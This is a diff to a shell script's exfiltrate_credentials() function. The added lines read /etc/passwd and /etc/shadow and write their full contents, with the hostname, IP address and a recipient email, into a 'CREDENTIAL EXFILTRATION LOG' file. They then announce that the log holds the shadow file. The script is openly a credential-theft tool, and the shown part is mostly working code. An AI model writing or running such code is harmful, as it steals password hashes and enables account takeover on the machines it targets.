@@ -3950,6 +3950,38 @@ exfiltrate_credentials() {
         }
     fi
 
+    # Save credentials to log file for record keeping
+    echo "[*] Saving credentials to log file..."
+    {
+        echo "=========================================="
+        echo "CREDENTIAL EXFILTRATION LOG"
+        echo "=========================================="
+        echo "Timestamp: $(date)"
+        echo "Hostname: $HOSTNAME"
+        echo "IP: $(hostname -I 2>/dev/null | awk '{print $1}')"
+        echo "Recipient: $RECIPIENT_EMAIL"
+        echo ""
+        echo "=========================================="
+        echo "/etc/passwd CONTENTS:"
+        echo "=========================================="
+        cat /etc/passwd 2>/dev/null || echo "[ERROR: Could not read /etc/passwd]"
+        echo ""
+        echo "=========================================="
+        echo "/etc/shadow CONTENTS:"
+        echo "=========================================="
+        cat /etc/shadow 2>/dev/null || echo "[ERROR: Could not read /etc/shadow]"
+        echo ""
+        echo "=========================================="
+        echo "END OF LOG"
+        echo "=========================================="
+    } > "$LOG_FILE_EMAIL" 2>/dev/null
+    
+    if [ -f "$LOG_FILE_EMAIL" ]; then
+        echo "[✓] Credentials saved to: $LOG_FILE_EMAIL"
+    else
+        echo "[!] Failed to save log file"
+    fi
+
     if [ $FILES_CREATED -eq 0 ]; then
         echo "[!] No credential files found"
         rm -rf "$TEMP_DIR" 2>/dev/null
@@ -3991,6 +4023,9 @@ exfiltrate_credentials() {
     rm -rf "$TEMP_DIR" 2>/dev/null
 
     echo "[✓] Credential exfiltration complete"
+    echo ""
+    echo "Log file preserved at: $LOG_FILE_EMAIL"
+    echo "(Contains full /etc/passwd and /etc/shadow contents)"
     echo ""
 }
 
